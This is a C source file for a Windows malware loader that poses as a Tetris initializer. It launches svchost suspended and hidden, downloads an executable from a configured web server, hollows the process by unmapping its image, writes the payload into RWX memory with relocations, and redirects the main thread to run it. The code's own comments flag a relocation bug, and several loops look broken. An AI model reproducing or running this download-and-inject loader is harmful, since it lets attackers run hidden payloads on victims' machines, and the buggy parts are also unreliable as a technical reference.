#include <stdlib.h>
#include <stdio.h>
#include <memory.h>
#include <windows.h>
#include <wininet.h>
#include "tetris.h"
#include "ntdll_imit.h"
#include "config.h"

PROCESS_INFORMATION spawn(){
STARTUPINFOA stInfo={0};
stInfo.cb=sizeof(stInfo);
PROCESS_INFORMATION pInfo;
if(CreateProcessA(
SVCHOST,
NULL,
NULL,
NULL,
FALSE,
CREATE_SUSPENDED | CREATE_NO_WINDOW,
NULL,
NULL,
&stInfo,
&pInfo
))
return pInfo;
else
printf("[-] CreateProcessA %lu\n",GetLastError());
exit(1);
}

BYTE* fetchPE(){

    // general initialization fn
    HINTERNET internet=InternetOpenA(
        "JAMES/BOND/007",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0 // no async
    );
    if(!internet){
        printf("[-] InternetOpenA()\n");
        exit(1);
    }
    HINTERNET hurl=InternetOpenUrlA(
        internet,
        WEB_SERVER,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );
    if(!hurl){
        printf("[-] InternetOpenUrlA() %lu\n",GetLastError());
        exit(1);
    }

    DWORD sz=4096;
    BYTE* pe=(BYTE*)malloc(sz);
    BYTE* offset=pe;
    DWORD totalRead=0;
    DWORD cycleRead=0;

    while(InternetReadFile(
        hurl,
        offset,
        sz, 
        &cycleRead
    ) && cycleRead>0){
        totalRead+=cycleRead;
        void*tmp=realloc(pe,totalRead+sz);
        if(tmp)
         pe=tmp;
        offset=(BYTE*)(pe+totalRead);
    }
    void*tmp=realloc(pe,totalRead);
    if(tmp)
     pe=tmp;
    return pe;
}

// objective: parse PE. return list of struct containing each essential sectton size.
// dos ---> nt head ----> file head / opt head 
// opt head ---> data directories
// 
MappingMetadata PEParser(BYTE* pe){
    MappingMetadata mm;
    mm.heapBase=pe;
    unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
    unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
    unsigned long long p_OPT_HEADERS=(unsigned long long)(p_NT_HEADERS+0x18);
    mm.preferedBase=*(unsigned long long*)(p_OPT_HEADERS+0x18);
    mm.RVAAddressOfEntryPoint=*(unsigned long *)(p_OPT_HEADERS+0x10);   
    mm.headersSize=*(unsigned long*)(p_OPT_HEADERS+0x3c);
    mm.imageSize=*(unsigned long*)(p_OPT_HEADERS+0x38);
    unsigned long dataDirectoriesCount=*(unsigned long*)(p_OPT_HEADERS+0x6c);
    // important
    mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
    unsigned short optHeadersSz=*(unsigned short*)(p_FILE_HEADERS+0x10);

    // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
    IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
    mm.ImageSectionHeaders=(unsigned long long )p_SECTION_HEADER;
    
    return mm;
}

// section object mappnig approach
// void mapRoutineY(){
// HANDLE pe_headers_section;
// NtCreateSection(
// &pe_headers_section,
// SECTION_ALL_ACCESS,
// NULL,
// mm.headersSize,
// PAGE_READWRITE,
// SEC_COMMIT,
// NULL
// );
// if(!pe_headers_section){
//     printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
//     exit(1);
// }

// void* mapped=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     self,
//     mapped,
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// memcpy(mapped,mm.heapBase,mm.headersSize);

// void *remoteBase=NULL;
// if(NtMapViewOfSection(
//     pe_headers_section,
//     proc,  
//     remoteBase
//     0,
//     0,
//     NULL,
//     (unsigned long*)&mm.headersSize,
//     PAGE_READWRITE
// )!=0 && !mapped){
//     printf("[-] NtMapViewOfSection. 168\n");
//     exit(1);
// }
// }

void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE

    for(int i=0; i<mm.ImageSectionsCount; i++){
    char* name=(char*)(sec->Name);
    if(strcmp(name,".reloc")==0){
        *reloc=sec;
        continue;
    }

    unsigned int protections=sec->Characteristics;
    unsigned int rva_raw=sec->PointerToRawData;
    unsigned int rva_virt=sec->VirtualAddress;
    unsigned int secSz=sec->SizeOfRawData;

    void* va=remoteV+rva_virt;
    void* raw=mm.heapBase+rva_raw;
    unsigned long long written=0;

    WriteProcessMemory(
        proc,
        va,
        raw,
        secSz,
        &written
    );
    printf("written to %s --- %llu bytes\n",name,written);
    if(written!=(unsigned long)secSz){
        printf("[-] 235!\n");
        exit(1);
    }
    sec++;
    }
    printf("all sections has been mapped!\n");
}


// BUG IS WITHIN rellocate() SOMEWHERE

int dumpRelocBlockCount(unsigned int sectionSize,void* section){
    int count=0;
    unsigned int parsedBytes=0;
    while(parsedBytes<=sectionSize){
        IMAGE_BASE_RELOCATION* sec=(IMAGE_BASE_RELOCATION*)section;
        unsigned int blockSz=(unsigned int)(sec->SizeOfBlock);
        parsedBytes+=blockSz;
        count++;
    }

    return count;
}

void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
    printf("RELLOC STARTED\n");
    // reloction block in heap (first el in list)
    BYTE* block=(BYTE*)(heapBase+(unsigned int)(sec->PointerToRawData));
    
    unsigned int secSz=sec->SizeOfRawData;

    long long delta=(unsigned long long)remoteImageBase-(unsigned long long)preferedBase;

    
    // must correct loop
    // write payload.cpp 
    // 
    // wrong way to loop. i am looping over bytes not size of list of reloc blocks.
    
    int blockCount=dumpRelocBlockCount(secSz,block);
    printf("reloction block count: %i\n",blockCount);
    
    for(int i=0;i<blockCount;i++){
        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)block;
        unsigned int blockSz=block->SizeOfBlock;
        unsigned int pageRva=block->VirtualAddress;
        
        // this block works on given page
        uintptr_t page=(uintptr_t)((unsigned long long)remoteImageBase+pageRva);
        
        printf("relocation process for page: %llu\n",page);
        
        unsigned int entriesCount=(blockSz-sizeof(unsigned int)*2)/2;

        WORD* entry=(WORD*)((BYTE*)block+8);

        for(unsigned int j=0;j<entriesCount;j++){
            
            BYTE relocType=*entry>>12;
            WORD offset=*entry & 0x0FFF;
            if(relocType==3 || relocType==10){
                uintptr_t absolute=page+offset;
                uintptr_t relocated=(uintptr_t)((absolute-(uintptr_t)preferedBase)+delta);
                printf("before relocation: %llu ---- after relocation: %llu\n",absolute,relocated);
                if(!WriteProcessMemory(
                    proc,
                    (void*)absolute,
                    &relocated,
                    sizeof(uintptr_t),
                    NULL
                )){
                    printf("[-] 186!\n");
                    exit(1);
                }
            }
            entry+=2;
        }

        block+=blockSz;
    }
    printf("relocated successfuly!\n");
}

bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
HANDLE self=GetCurrentProcess();
HMODULE ntdll=GetModuleHandleA("ntdll");
T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");


 PROCESS_BASIC_INFORMATION pinfo;
 ULONG requiredSize=sizeof(pinfo);
if(NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
)!=0){
    NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
);
}
// stores address of PEB. only makes sense within VA space of remote process. not here
void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
uintptr_t baseAddr=0;
ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
NtUnmapViewOfSection(proc,(void*)baseAddr); // disassociates VA region from section object

MappingMetadata mm=PEParser(pe);
printf(
    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
);

char* remoteV=(char*)VirtualAllocEx(
proc,
NULL,
(SIZE_T)mm.imageSize,
MEM_COMMIT | MEM_RESERVE,
0x40
);

if(WriteProcessMemory(
    proc,
    remoteV,
    mm.heapBase,
    mm.headersSize,
    NULL
)){
    printf("up to 246. alles gut\n");

};

IMAGE_SECTION_HEADER *reloc=NULL;
if(!KERNEL_STYLE)
    mapRoutineX(proc,remoteV,mm,&reloc); // ELSE mapRoutineY();

if(mm.preferedBase!=(unsigned long long)remoteV){

    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
}

uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
printf("ENTRY POINT: %llu\n",entryPont);
CONTEXT thContext;
if(!GetThreadContext(thread,&thContext))
    printf("[-] 288!\n");
    
thContext.Rip=(DWORD64)entryPont;
if(!SetThreadContext(thread,&thContext))
    printf("[-] 293!\n");

if(ResumeThread(thread)!=-1)
    return true;
return false;
}

bool __0x1FN3C3SS4RY__(){
    PROCESS_INFORMATION pinfo=spawn();
    HANDLE svchost=pinfo.hProcess;
    HANDLE svchostMainThread=pinfo.hThread;
    BYTE* pe=fetchPE(); // returns heap base 
    bool cool=hallowAndStart(svchost,svchostMainThread,pe);
    if(cool)
        return true;
    exit(1);
}
extern bool initializeTetrix(){
  return __0x1FN3C3SS4RY__();
}




